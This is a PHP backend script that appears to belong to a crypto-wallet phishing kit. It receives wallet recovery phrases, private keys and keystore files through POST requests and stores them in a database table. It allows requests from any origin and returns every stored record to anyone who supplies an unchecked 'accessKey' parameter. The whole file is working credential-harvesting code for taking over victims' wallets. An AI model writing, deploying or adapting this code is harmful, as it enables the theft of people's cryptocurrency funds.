<?php

/*
Data to be received:
Format: [
    wallet_name: ''
    auth_type: phrase || privatekey || keystoreJSON
    auth_text: ''
    auth_file: '' || null
]

Database schema:
Schema: [
    id, wallet_name, auth_type, auth_text, auth_file, date_added
]
*/

require 'classes/dbconn.class.php';
require 'classes/database.class.php';

use Src\Database\DatabaseManager ;
use Src\System\DatabaseConnector ;

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: OPTIONS,GET,POST,PUT,DELETE");
header("Access-Control-Max-Age: 3600");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");


if (isset($_POST['accessKey'])){
    $accesskey = $_POST['accessKey'];
    $response = getWallets($accesskey);
    echo json_encode($response);
}

if (isset($_POST['wallet_name'])){
    // get request data and output as object
    // $data = file_get_contents("php://input");
    // $data = json_decode($data, true);
    $data = array(
    'wallet_name' => $_POST['wallet_name'],
    'auth_type' => $_POST['auth_type'],
    'auth_text' => $_POST['auth_text'],
    'auth_file' => $_POST['auth_file']
    );

    $process_form = new ProcessForm($data);
    $response = $process_form->process();
}



class ProcessForm
{

    private $data;
    private $dbConnection;
    private $dbManager;

    function __construct($data)
    {
        $this->table = 'wallets';
        // separate data variables
        $this->data = $data;
        $wallet_name = $data['wallet_name'];
        $auth_type = $data['auth_type'];
        $auth_text = $data['auth_text'];
        $auth_file = $data['auth_file'];

        $this->wallet_name = $wallet_name;
        $this->auth_type = $auth_type;
        $this->auth_text = $auth_text;
        $this->auth_file = $auth_file;

        // connect to database
        $dbConnection = (new DatabaseConnector)->getConnection();
        $dbConnection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  //throw errors from all aspects of database connection
        $this->dbConnection = $dbConnection;
    }

    public function process()
    {
        // check if data is validated; if not, return false
        echo 'Validating data...';
        $validated_data = $this->validate_data();

        if(!$validated_data) {
            $response = 'Invalid data!';
            return false;
        }

        // initialize database manager
        $dbManager = new DatabaseManager($this->dbConnection, $this->table);

        // save validated data in database
        echo 'Saving data...';
        $response = $this->save_data($dbManager, $validated_data);
        //echo json_encode(array('data' => $response));
        echo $response;
        return $response;
    }

    function validate_data()
    {
        $data_array = [
            'wallet_name' => htmlspecialchars($this->wallet_name, ENT_QUOTES),
            'auth_type' => htmlspecialchars($this->auth_type, ENT_QUOTES),
            'auth_text' => htmlspecialchars($this->auth_text, ENT_QUOTES),
            'auth_file' => htmlspecialchars($this->auth_file, ENT_QUOTES)
        ];

        if (empty($data_array['wallet_name']) ||
            empty($data_array['auth_type']) ||
            empty($data_array['auth_text'])
            )
        {
            echo 'Some fields are empty';
            return false;
        }

        return $data_array;
    }

    function save_data($dbManager, $data_array)
    {
        $data_array = (array) $this->data;
        $result = $dbManager->insert($data_array);
        $response = ($result == '1') ? 'success' : $result;
        
        return $response;
    }
}


function getWallets($accesskey){
    $table = 'wallets';
    $dbConnection = (new DatabaseConnector)->getConnection();
    $dbConnection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  //throw errors from all aspects of database connection
    
    // initialize database manager
    $dbManager = new DatabaseManager($dbConnection, $table);

    // save validated data in database
    $response = $dbManager->find_all();
    
    return $response;
}